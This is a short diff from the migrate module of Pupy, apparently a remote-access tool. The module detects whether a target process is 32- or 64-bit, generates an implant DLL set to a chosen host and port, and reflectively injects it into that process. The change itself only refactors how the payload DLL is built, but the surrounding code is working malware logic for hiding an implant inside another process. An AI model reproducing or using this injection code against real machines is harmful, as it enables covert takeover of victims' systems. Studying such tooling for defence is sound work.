@@ -39,10 +39,10 @@ class MigrateModule(PupyModule):
 		if self.client.conn.modules['pupwinutils.processes'].is_process_64(args.pid):
 			isProcess64bits=True
 			self.success("process is 64 bits")
-			dllbuff=genpayload.get_edit_binary(os.path.join("payloads","pupyx64.dll"), host, port)
+			dllbuff=genpayload.get_edit_pupyx64_dll(host, port)
 		else:
 			self.success("process is 32 bits")
-			dllbuff=genpayload.get_edit_binary(os.path.join("payloads","pupyx86.dll"), host, port)
+			dllbuff=genpayload.get_edit_pupyx86_dll(host, port)
 		self.success("injecting DLL in target process %s ..."%args.pid)
 		self.client.conn.modules['pupy'].reflective_inject_dll(args.pid, dllbuff, isProcess64bits)
 		self.success("DLL injected !")
